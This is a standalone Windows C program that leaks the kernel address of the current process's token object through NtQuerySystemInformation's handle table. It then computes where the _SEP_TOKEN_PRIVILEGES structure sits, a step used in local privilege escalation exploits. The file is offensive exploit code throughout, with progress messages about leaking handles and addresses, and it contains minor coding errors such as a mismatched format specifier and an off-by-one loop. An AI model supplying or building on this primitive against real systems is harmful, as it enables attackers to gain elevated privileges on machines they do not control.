#include <stdio.h>
#include <Windows.h>

#define STATUS_SUCCESS 0x0

typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
);

typedef struct _SYSTEM_HANDLE {
	ULONG ProcessId;
	UCHAR ObjectTypeNumber;
	UCHAR Flags;
	USHORT Handle;
	PVOID Object;
	ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, *PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX {
	ULONG NumberOfHandles;
	ULONG Reserved;
	SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
	PVOID Object;
	USHORT UniqueProcessId;
	USHORT HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

PVOID GetTokenAddr(ULONG pid){
	ULONG retLength = 0;
	HINSTANCE hNtdll = LoadLibraryA("ntdll");
	HANDLE cPid = GetCurrentProcess();
	HANDLE h;
	BOOL token = OpenProcessToken(cPid, TOKEN_QUERY, &h);

	printf("[+] Attempting to leak Token Handle for the current process..\n");
	if(token == 0){
		printf("[-] Error obtaining Token Handle: %s\n", GetLastError());
	}
	else {
		printf("[+] Successfully leaked the Token Handle for the current process: 0x%X\n", h);
	}

	PSYSTEM_HANDLE_INFORMATION_EX buffer;
	ULONG bufferSize = 0xffffff;
	buffer = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
	NTSTATUS status;
	PUCHAR token_addr = NULL;

	printf("[+] Attempting to leak the Object Address of the Token Handle..\n");
	_NtQuerySystemInformation NtQuerySysInfo = (_NtQuerySystemInformation)(GetProcAddress(hNtdll, "NtQuerySystemInformation"));
	status = NtQuerySysInfo(0x10, buffer, bufferSize, &retLength);
	if(status != STATUS_SUCCESS){
		printf("[-] NtQuerySystemInformation Failed!\n");
		exit(-1);
	}
	for (ULONG i = 0; i <= buffer->NumberOfHandles; i++){
		if((buffer->Handles[i].ProcessId == pid) && (buffer->Handles[i].ObjectTypeNumber == 5)){
			printf("[+] PID: %d, Kernel Address: 0x%p, ObjectType: %d, Handle 0x%X\n", buffer->Handles[i].ProcessId, buffer->Handles[i].Object, buffer->Handles[i].ObjectTypeNumber, buffer->Handles[i].Handle);
			token_addr = buffer->Handles[i].Object;
		}
	}
	return token_addr;
}

int main(int argc, char *argv[]){
	PUCHAR pTokenAddr = GetTokenAddr(GetCurrentProcessId());
	PUCHAR SepToken = pTokenAddr + 0x40;
	printf("[+] Token Kernel Address: 0x%p\n", pTokenAddr);
	printf("[+] Location of _SEP_TOKEN_PRIVILEGES: 0x%p\n", SepToken);
  
  return 0;
}
